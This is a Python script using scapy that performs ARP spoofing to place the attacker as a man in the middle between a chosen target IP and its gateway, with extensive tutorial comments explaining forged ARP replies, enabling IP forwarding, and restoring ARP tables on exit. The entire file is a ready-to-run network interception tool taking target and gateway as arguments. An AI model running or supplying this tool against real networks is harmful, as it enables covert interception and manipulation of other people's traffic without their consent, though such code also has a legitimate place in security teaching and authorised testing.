#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse

# For doing ARP spoof in order to become the man in the middle we have to exploit 
# the ARP protocol and redirect the flow packets so that it flows through our computer.
# For doing this,we need to send our ARP responses to the router onto the target computer.
# When we send it to the target computer we pretend to be the router and we tell the router 
# that we are the target computer.So at first, we have to create an ARP response, not an
# ARP request.To do this, we gonna use scapy. Now scapy.ARP() has many constructor fields.
# One of them is ``op``.If op=1, then it scapy.ARP() will create an ARP request and if op=2
# then it will create an ARP response.So we set the op=2.The next field we have to define is
# the ip of the target computer.We can do this by using ``pdst``.Then we have to set the mac 
# address of the target computer. We can use ``hwdst`` field to set that.To get target's ip 
# address and mac address, we can use network scanner of in-built kali machine or the network
# scanner created by me.The next thing we have to do is define the ip adress of the router
# (here we are going to tell the target computer that this is coming from the router).To get 
# the ip address of the router, we can use 'route -n' command in linux terminal.To define 
# roter's ip address, we will use ``psrc`` field.And finally, we are saving the packet response
# in a variable called ```arp_response_packet```.
# Now the ques arise, why we gonna do that!! We are doing this because, whenever the 
# 'arp_response_packet' packet is sent and received by the target computer they will see that 
# it's coming from the MAC address of the attacker's machine.But they'll think this is sent by 
# the routers IP and therefore it's ARP table associate this IP which is the router IP with 
# the MAC address of the machine of the attacker.And this will place the attacker in the middle 
# of the connection.So every time that the target computer wants to send anything to the router 
# it will use the MAC address that's associated with the routers IP and that MAC address is going 
# to be the Attacker's MAC address.And if we send it it'll actually fool the target into thinking 
# that we are the router.As the request don't verify thhe ip & mac address, so the packet will not 
# be rejected by the victim. It will just accept the packet.

# In the second step we have to do the same between hacker & router.

# Now, as we are working as a man in the middle, whenever the victim wants to send response to the
# router, the response will to us first.Thn we have to forward it to the router.This is called ip 
# forwarding.To enable ip forward,we have to run the following command in the command line: 
# echo 1 > /proc/sys/net/ipv4/ip_forward


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target",help="Target IP Address")
    parser.add_argument("-g","--gateway",dest="gateway",help="Gateway IP Address\nExample: python3 arp_spoofer.py -t 10.0.1.7 -g 10.0.1.1")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target's IP address, use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
    return options



# This function is used to get the mac address of of a device using the ip address of that device
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)
    
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac_address = get_mac(target_ip)
    arp_response_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac_address,psrc=spoof_ip) 
    scapy.send(arp_response_packet,verbose=False) # This line will send the packet & we are setting verbose to false so that it won't show extra info
    # print(arp_response_packet.show())
    # print(arp_response_packet.summary())


# The importance of this function is to restore the connection between the router & the victim
# when the hacker stops to send packets.So here the hacker will not be man in the middle anymore. 
# To do this, we have associate router's ip with router's mac address and send the packet to the victim
# and associate victim's mac address with victim's ip address and send the packet to the router
def restore(destination_ip,source_ip):
    destination_mac_address = get_mac(destination_ip)
    source_mac_address = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac_address,psrc=source_ip,hwsrc=source_mac_address) # Here we have to define source mac address. Else by default it will be set to hackers mac address.And so, the error won't be fixed.
    scapy.send(packet,count=4,verbose=False) # Here we are setting count=4 which means we are sending our packets 4 times, so we make sure that the target machine corrects it's arp table.


sending_packets_count = 0
options = get_arguments()
target_ip=options.target
gateway_ip=options.gateway

try:
    while True: # We need to run a loop to make router & victim fool till we want

        # This line will send the packet to the victim saying that the hacker is the router(in other word, 
        # the hacker has the router's MAC address but MAC address will be of the hacker.Here mac address is 
        # being associated with router's ip by the arp request)
        spoof(target_ip,gateway_ip)

        # This line will send the packet to the router saying that the hacker is the victim(in other word, 
        # the hacker has the victim's MAC address but MAC address will be of the hacker.Here mac address is 
        # being associated with victim's ip by the arp request)
        spoof(gateway_ip,target_ip)

        sending_packets_count = sending_packets_count + 2
        print("\r[+] Sent packets: "+str(sending_packets_count), end="")

        # This will set a 2 second delay before sending every two packets.So that, there will create no traffic 
        # in sending packets.
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C...Resetting ARP Tables...Please Wait!! \n")

    # When we have stopped sending packets, we have to restore all the mac address with proper device so that 
    # router & victim can communicate with each other, without the hacker being man in the middle.
    restore(target_ip,gateway_ip) # This will give the target or victim the right mac address of the router
    restore(gateway_ip,target_ip) # This will give the router the right mac address of the target or victim


